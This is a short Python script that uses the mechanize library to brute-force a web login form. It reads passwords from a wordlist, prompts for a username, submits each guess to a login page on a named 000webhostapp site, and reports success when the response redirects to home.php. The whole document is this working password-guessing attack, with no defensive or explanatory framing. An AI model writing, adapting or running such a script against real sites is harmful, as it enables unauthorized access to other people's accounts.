import mechanize
browser = mechanize.Browser()

url = "http://waithawoo.000webhostapp.com/index.html"
wordlist = "wordlist.txt"

try:
		wordlist = open(wordlist, "r")
except:
		print("\nWordlist Not Found!")
		quit()
username = input("Enter username if know or Guess : ")
print("Guessing passwords for " + username + "................")
for password in wordlist:
	response = browser.open(url)
	browser.select_form(nr=0)
	browser.form['username'] = username
	browser.form['password'] = password.strip()
	browser.method = "POST"
	response = browser.submit()

	if response.geturl() == "http://waithawoo.000webhostapp.com/home.php":
		print("Password Found! :" + password.strip())
		break
	else :
		print("Password not found yet!")

if response.geturl() != "http://waithawoo.000webhostapp.com/home.php":
	print("Please re-check Username Or Update wordlist file!")